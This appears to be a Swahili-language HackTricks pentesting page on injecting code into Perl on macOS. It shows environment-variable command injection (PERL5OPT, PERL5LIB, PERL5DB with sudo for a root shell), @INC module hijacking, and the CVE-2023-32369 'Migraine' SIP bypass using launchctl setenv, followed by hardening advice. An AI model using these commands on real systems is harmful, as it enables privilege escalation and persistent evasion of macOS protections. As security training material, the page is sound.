# Injection ya Applications za Perl kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## Kupitia env variable za `PERL5OPT` na `PERL5LIB`

Kwa kutumia env variable **`PERL5OPT`**, inawezekana kufanya **Perl** itekeleze amri za kiholela interpreter inapoanza (hata **kabla** mstari wa kwanza wa target script haujaparsiwa).
Kwa mfano, tengeneza script hii:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Sasa **export env variable** na utekeleze script ya **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Chaguo jingine ni kuunda Perl module (kwa mfano, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Kisha tumia env variables ili module ipatikane na kupakiwa kiotomatiki:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Vigezo vingine vya mazingira vinavyovutia

* **`PERL5DB`** – interpreter inapoanzishwa kwa flag ya **`-d`** (debugger), maudhui ya `PERL5DB` hutekelezwa kama Perl code *ndani* ya debugger context.
Ikiwa unaweza kudhibiti environment pamoja na command-line flags za Perl process yenye privileges, unaweza kufanya hivi:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – kwenye Windows, variable hii hudhibiti shell executable ambayo Perl itatumia inapohitaji kuanzisha shell. Imetajwa hapa kwa ukamilifu tu, kwa kuwa haihusiki na macOS.

Ingawa `PERL5DB` inahitaji switch ya `-d`, ni kawaida kukuta maintenance au installer scripts zinazoendeshwa kama *root* zikiwa na flag hii imewezeshwa kwa ajili ya verbose troubleshooting, na hivyo variable hii kuwa escalation vector halali.

## Kupitia dependencies (@INC abuse)

Inawezekana kuorodhesha include path ambayo Perl itatafuta (**`@INC`**) kwa kuendesha:
```bash
perl -e 'print join("\n", @INC)'
```
Matokeo ya kawaida kwenye macOS 13/14 yanaonekana hivi:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Baadhi ya folda zilizorejeshwa hazipo kabisa, hata hivyo **`/Library/Perl/5.30`** ipo, *hailindwi* na SIP na iko *kabla* ya folda zinazolindwa na SIP. Kwa hivyo, ikiwa unaweza kuandika ukiwa kama *root* unaweza kuweka module hasidi (kwa mfano `File/Basename.pm`) ambayo itapakiwa kwa *kipaumbele* na script yoyote yenye privileges inayoingiza module hiyo.

> [!WARNING]
> Bado unahitaji **root** ili kuandika ndani ya `/Library/Perl`, na macOS itaonyesha ombi la **TCC** linaloomba *Full Disk Access* kwa mchakato unaotekeleza operesheni ya kuandika.

Kwa mfano, ikiwa script inaingiza **`use File::Basename;`**, ingewezekana kuunda `/Library/Perl/5.30/File/Basename.pm` ikiwa na code inayodhibitiwa na attacker.

## SIP bypass via Migration Assistant (CVE-2023-32369 “Migraine”)

Mnamo Mei 2023 Microsoft ilifichua **CVE-2023-32369**, iliyopewa jina la utani **Migraine**, mbinu ya post-exploitation inayomwezesha attacker wa *root* **kupita kabisa System Integrity Protection (SIP)**.
Component iliyo hatarini ni **`systemmigrationd`**, daemon iliyopewa entitlement ya **`com.apple.rootless.install.heritable`**. Mchakato wowote wa child unaozalishwa na daemon hii hurithi entitlement hiyo na hivyo huendeshwa **nje ya** vizuizi vya SIP.<sup>[1]</sup>

Miongoni mwa children waliotambuliwa na watafiti ni interpreter iliyosainiwa na Apple:<sup>[1]</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Kwa sababu Perl huzingatia `PERL5OPT` (na Bash huzingatia `BASH_ENV`), kuchafua *mazingira* ya daemon kunatosha kupata arbitrary execution katika context isiyo na SIP:<sup>[1][2]</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Wakati `migrateLocalKDC` inaendeshwa, `/usr/bin/perl` huanza ikiwa na `PERL5OPT` hasidi na kutekeleza `/private/tmp/migraine.sh` *kabla SIP kuwezeshwa tena*. Kutoka kwenye script hiyo, unaweza, kwa mfano, kunakili payload ndani ya **`/System/Library/LaunchDaemons`** au kugawa faili extended attribute ya **`com.apple.rootless`** ili kuifanya faili **isiweze kufutwa**.

Apple ilirekebisha suala hili katika macOS **Ventura 13.4**, **Monterey 12.6.6** na **Big Sur 11.7.7**, lakini mifumo ya zamani au ambayo haijawekewa patch bado inaweza kudhulumiwa.<sup>[1]</sup>

## Mapendekezo ya kuimarisha usalama

1. **Futa variables hatari** – launchdaemons zenye privileges au cron jobs zinapaswa kuanza zikiwa na environment safi (`launchctl unsetenv PERL5OPT`, `env -i`, n.k.).
2. **Epuka kuendesha interpreters kama root** isipokuwa ikiwa ni lazima kabisa. Tumia compiled binaries au punguza privileges mapema.
3. **Weka scripts za vendor zikiwa na `-T` (taint mode)** ili Perl ipuuze `PERL5OPT` na switches nyingine zisizo salama wakati taint checking imewezeshwa.
4. **Weka macOS ikiwa imeboreshwa kila wakati** – “Migraine” imerekebishwa kikamilifu katika matoleo ya sasa.

## Marejeo

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
